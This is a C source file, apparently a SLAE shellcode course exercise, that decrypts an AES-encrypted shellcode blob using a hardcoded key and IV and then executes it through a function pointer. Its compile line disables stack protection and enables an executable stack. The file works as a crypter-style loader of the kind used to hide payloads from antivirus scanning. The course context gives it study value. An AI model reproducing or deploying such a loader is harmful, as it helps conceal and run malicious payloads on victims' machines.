#include <stdio.h>

#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>


/**
 * decrypt.c
 * Student Id: SLAE-1058
 * Original version from:
 * 	-> https://gist.github.com/bricef/2436364
 * compile: gcc test.c -o test /usr/lib/libmcrypt.a  -z execstack -fno-stack-protector
 * */


/**
 * If the encrypted shellcode has any null byte, 
 * we can't get the strlen closest to 16 multiple (as we did in encrypter.c)
 * 
 * */
#define SHELLCODE_LENGTH 256		// Put here the output length from the encrypter



void print_shellcode(unsigned char *shellcode, int len) {
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}


int decrypt(
	void* buffer,
	int buffer_len,
	char* IV,
	char* key,
	int key_len
){
	MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
	int blocksize = mcrypt_enc_get_block_size(td);
	if( buffer_len % blocksize != 0 ){return 1;}
	mcrypt_generic_init(td, key, key_len, IV);
	mdecrypt_generic(td, buffer, buffer_len);
	mcrypt_generic_deinit (td);
	mcrypt_module_close(td);
	return 0;
}


int main(int argc, char **argv)
{

	MCRYPT td, td2;

	char* IV = "AAAAAAAAAAAAAAAA";		//16
	char *key = "0123456789abcdef";		//16
	int keysize = 16; /* 128 bits */
	
	unsigned char shellcode[] = \
	"\xbe\x85\x67\x63\x1f\x24\x77\xf4\x22\x83\x57\xf6\x1c\x9a\x8a"
	"\x68\x3d\x4f\x7b\x65\x2d\x94\x98\xb4\x9e\x2d\xad\x3b\x22\x48"
	"\xea\x36\x4b\xa5\xed\x99\xd0\xb1\xbc\x05\x48\xf4\x11\x71\xf9"
	"\xa9\xda\xce\xb5\x5f\xce\x71\xc9\xdb\xa0\xb9\x3f\x82\x11\x98"
	"\x4d\x50\x56\x3d\x43\xb2\xb7\xd0\x60\x5a\x62\xfd\x5a\xf0\xac"
	"\x1b\xcb\xea\x84\x8e\x8e\xde\x67\xf7\xa9\x03\xab\x3b\xfe\x47"
	"\x18\x89\x83\x5d\x06\xab\x98\xa6\xcc\x6e\x80\xf9\x29\x54\x06"
	"\x5d\xa6\xb0\xdc\xa5\xa4\x74\x52\xab\xec\xf8\x83\x31\xe7\x02"
	"\xd6\x93\xce\xb9\x9d\x91\x01\x00\x41\xa7\x00\xcb\xa9\x42\x41"
	"\x21\xf2\x4c\xdb\x2f\x0e\x37\x58\xde\xfd\x43\x6e\xe5\x69\x48"
	"\x1a\x5d\x1e\xc1\xbe\xd5\x17\xa6\x80\xac\x4a\xe7\x71\x9e\x3e"
	"\x6f\x95\x1e\xf1\x01\xab\x23\x8b\xa8\x16\xbd\x29\xc3\x30\x67"
	"\xf2\x2b\x37\x7e\x32\x93\x69\x63\x8c\x36\x5e\xd7\x33\x99\x39"
	"\x3b\x3a\xda\xee\xad\x40\xde\x4c\x04\xca\x37\x07\xa6\x87\x09"
	"\xe2\x38\xce\x6f\xab\xd3\x21\xc1\x2a\x98\x5a\x71\xa2\x36\x05"
	"\xf5\x88\xa6\x28\x21\x1b\xd7\x7e\x39\xfd\x09\x13\x03\x14\xee"
	"\xb2\x1e\x6d\xc1\x9e\x93\x86\x34\xbe\x38\x45\x57\x59\xe9\x8b"
	"\x25";
	
	decrypt(shellcode, SHELLCODE_LENGTH, IV, key, keysize);
	
	printf("[x] Trying to decrypt the shellcode ...\n");
	
	printf("[x] Decrypted size: %d\n", strlen(shellcode));
	printf("[x] Executing ...\n");
	int (*ret)() = (int(*)())shellcode;
	ret();
	
	return 0;
}
